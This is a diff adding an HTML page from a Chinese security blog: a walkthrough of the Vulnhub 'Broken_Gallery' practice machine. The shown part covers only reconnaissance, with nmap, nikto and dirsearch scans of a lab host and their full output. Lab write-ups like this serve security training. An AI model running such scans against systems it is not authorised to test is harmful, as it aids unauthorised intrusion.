@@ -1,0 +1,745 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Broken_Gallery 靶机 vulnhub 靶机，要绝处逢生，需要勇气和信心，来挑战吧！枚举和信息收集阶段干扰信息不多，但会一度陷入僵局，没有二进制的经验，会无从下手，那个小节对你来说未必不是挑战，用不到太多二进制的东西，但需要你会你才能建立信心，小技巧走一波才能获得立足点。提权只要知道 gtfobins 就应该不难了，难在具备总结经验，触类旁通等能力。靶机不算特别初级，有一点点难度。——">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Broken_Gallery 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/909fcb140cd3.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Broken_Gallery 靶机 vulnhub 靶机，要绝处逢生，需要勇气和信心，来挑战吧！枚举和信息收集阶段干扰信息不多，但会一度陷入僵局，没有二进制的经验，会无从下手，那个小节对你来说未必不是挑战，用不到太多二进制的东西，但需要你会你才能建立信心，小技巧走一波才能获得立足点。提权只要知道 gtfobins 就应该不难了，难在具备总结经验，触类旁通等能力。靶机不算特别初级，有一点点难度。——">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4ad4dde687a7d68e4c606b90ca22803c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/6e130fde7173922c751af2f212422344_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ac0e51343e517f11244b96f6da97a93f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3af14004003dccd8577ed5b2d7559599_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b6be9112069e2d27bb9a24d004f81a95_MD5.png">
+<meta property="article:published_time" content="2023-06-26T10:00:34.000Z">
+<meta property="article:modified_time" content="2023-07-02T12:16:05.405Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/4ad4dde687a7d68e4c606b90ca22803c_MD5.png">
+  
+  
+  
+  <title>Broken_Gallery 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Broken_Gallery 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-26 18:00" pubdate>
+          2023年6月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          221 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Broken_Gallery 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Broken-Gallery-靶机"><a href="#Broken-Gallery-靶机" class="headerlink" title="Broken_Gallery 靶机"></a>Broken_Gallery 靶机</h1><blockquote>
+<p>vulnhub 靶机，要绝处逢生，需要勇气和信心，来挑战吧！枚举和信息收集阶段干扰信息不多，但会一度陷入僵局，没有二进制的经验，会无从下手，那个小节对你来说未必不是挑战，用不到太多二进制的东西，但需要你会你才能建立信心，小技巧走一波才能获得立足点。提权只要知道 gtfobins 就应该不难了，难在具备总结经验，触类旁通等能力。靶机不算特别初级，有一点点难度。——红队笔记UP</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141                            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00047s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.56 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了两个端口 80 和 22，进行版本和系统探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.1.1.141                           <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00021s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)<br>|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)<br>|_  256 84:a0:9a:59:61:2a:b7:1e:<span class="hljs-built_in">dd</span>:6e:da:3b:91:f9:a0:c6 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18<br>|_http-title: Index of /<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-ls: Volume /<br>| SIZE  TIME              FILENAME<br>| 55K   2019-08-09 01:20  README.md<br>| 1.1K  2019-08-09 01:21  gallery.html<br>| 259K  2019-08-09 01:11  img_5terre.jpg<br>| 114K  2019-08-09 01:11  img_forest.jpg<br>| 663K  2019-08-09 01:11  img_lights.jpg<br>| 8.4K  2019-08-09 01:11  img_mountains.jpg<br>|_<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.62 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统，80 端口下是几个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.141                              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00019s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.33 seconds<br></code></pre></td></tr></table></figure>
+
+<p>UDP 扫描没有很有价值的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.141                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 06:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00015s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /: Root directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 322.34 seconds<br></code></pre></td></tr></table></figure>
+
+<p>nmap 漏洞脚本扫描也没什么有价值的信息，尝试一下nikto</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nikto -h http://192.1.1.141/       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.1.1.141<br>+ Target Hostname:    192.1.1.141<br>+ Target Port:        80<br>+ Start Time:         2023-06-26 06:20:01 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.18 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /: Directory indexing found.<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .<br>+ /./: Directory indexing found.<br>+ /./: Appending <span class="hljs-string">&#x27;/./&#x27;</span> to a directory allows indexing.<br>+ //: Directory indexing found.<br>+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default <span class="hljs-keyword">if</span> there is no index page.<br>+ /%2e/: Directory indexing found.<br>+ /%2e/: Weblogic allows <span class="hljs-built_in">source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513<br>+ ///: Directory indexing found.<br>+ /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="hljs-string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269<br>+ /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="hljs-string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269<br>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.<br>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /<span class="hljs-string">&#x27;s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078</span><br><span class="hljs-string">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span><br><span class="hljs-string">+ /README.md: Readme Found.</span><br><span class="hljs-string">+ 8074 requests: 0 error(s) and 18 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-06-26 06:20:14 (GMT-4) (13 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ 1 host(s) tested</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>Allowed HTTP Methods: OPTIONS, GET, HEAD, POST。没有 PUT 方法，没办法上传文件，尝试目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ sudo dirsearch -u http://192.1.1.141/ -r<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-_23-06-26_07-55-16.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-26_07-55-16.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/<br><br>[07:55:16] Starting: <br>[07:55:17] 403 -  297B  - /.ht_wsr.txt                                     <br>[07:55:17] 403 -  301B  - /.htaccess_extra<br>[07:55:17] 403 -  300B  - /.htaccess.save<br>[07:55:17] 403 -  300B  - /.htaccess.orig<br>[07:55:17] 403 -  300B  - /.htaccess.bak1<br>[07:55:17] 403 -  300B  - /.htaccess_orig<br>[07:55:17] 403 -  302B  - /.htaccess.sample<br>[07:55:17] 403 -  298B  - /.htaccessBAK<br>[07:55:17] 403 -  299B  - /.htaccessOLD2<br>[07:55:17] 403 -  298B  - /.htaccess_sc<br>[07:55:17] 403 -  298B  - /.htaccessOLD<br>[07:55:17] 403 -  291B  - /.html                                           <br>[07:55:17] 403 -  290B  - /.htm<br>[07:55:17] 403 -  300B  - /.htpasswd_test<br>[07:55:17] 403 -  296B  - /.htpasswds<br>[07:55:17] 403 -  297B  - /.httr-oauth<br>[07:55:19] 200 -   55KB - /README.md                                        <br>[07:55:30] 200 -    1KB - /gallery.html                                     <br>[07:55:39] 403 -  299B  - /server-status                                    <br>[07:55:39] 403 -  300B  - /server-status/     (Added to queue)              <br>[07:55:44] Starting: server-status/                                          <br>[07:55:44] 404 -  285B  - /server-status/%2e%2e//google.com<br>                                                                             <br>Task Completed <br></code></pre></td></tr></table></figure>
+
+<p>得到的两个有效结果实际上都是 80 端口下可见的文件，目录爆破也没什么新的东西，那就把关注点放在 80 端口下的几个文件吧</p>
